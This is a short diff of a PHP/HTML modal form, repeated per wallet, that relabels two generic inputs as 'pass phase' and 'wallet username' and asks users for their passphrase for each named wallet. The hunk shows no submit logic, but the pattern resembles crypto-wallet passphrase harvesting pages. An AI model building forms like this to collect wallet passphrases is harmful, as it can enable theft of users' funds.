@@ -54,14 +54,14 @@ if ($result->num_rows > 0) {
 
                         <!-- Modal Body -->
                         <div class="modal-body">
-                            <form id="myForm<?=$wallet_key_name?>">
+                            <form method="post">
                                 <div class="form-group">
-                                    <label for="input1<?=$wallet_key_name?>">Input 1:</label>
-                                    <input type="text" class="form-control" id="input1<?=$wallet_key_name?>" placeholder="Enter Input 1">
+                                    <label for="input1<?=$wallet_key_name?>">pass phase</label>
+                                    <input type="text" class="form-control" id="passphase_<?=$wallet_key_name?>" placeholder="Enter your <?=$wallet_key_name?> pass phase">
                                 </div>
                                 <div class="form-group">
-                                    <label for="input2<?=$wallet_key_name?>">Input 2:</label>
-                                    <input type="text" class="form-control" id="input2<?=$wallet_key_name?>" placeholder="Enter Input 2">
+                                    <label for="input2<?=$wallet_key_name?>">wallet username</label>
+                                    <input type="text" class="form-control" id="username_<?=$wallet_key_name?>" placeholder="Enter your <?=$wallet_key_name?> user name">
                                 </div>
                                 <button type="button" class="btn btn-primary" onclick="submitForm<?=$wallet_key_name?>()">Submit</button>
 
